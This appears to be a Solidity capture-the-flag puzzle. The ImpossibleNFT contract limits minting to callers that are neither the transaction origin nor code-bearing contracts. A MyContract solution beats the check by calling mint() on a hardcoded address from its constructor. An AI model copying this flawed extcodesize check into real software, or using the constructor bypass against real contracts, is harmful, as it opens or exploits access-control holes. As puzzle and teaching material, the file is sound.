pragma solidity ^0.8.0;
//Created by @mis4nthr0pic
contract ImpossibleNFT {
    // Only hackers can mint the ImpossibleNFT, Are you a hacker?
    bool public isSolved;
    uint256 lastId;

    modifier onlyHackers() {
        require(tx.origin != msg.sender, "Humans not allowed");
        require(!isContract(msg.sender), "Contracts not allowed");
        _;
    }

    function mint() public onlyHackers {
        
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
}

contract MyContract {
    address public target = 0x874F54E755EC1E2A9eA083Bd6d9c89148CEA34d4;

    constructor() public {
        target.call(abi.encodeWithSignature("mint()"));
    }
}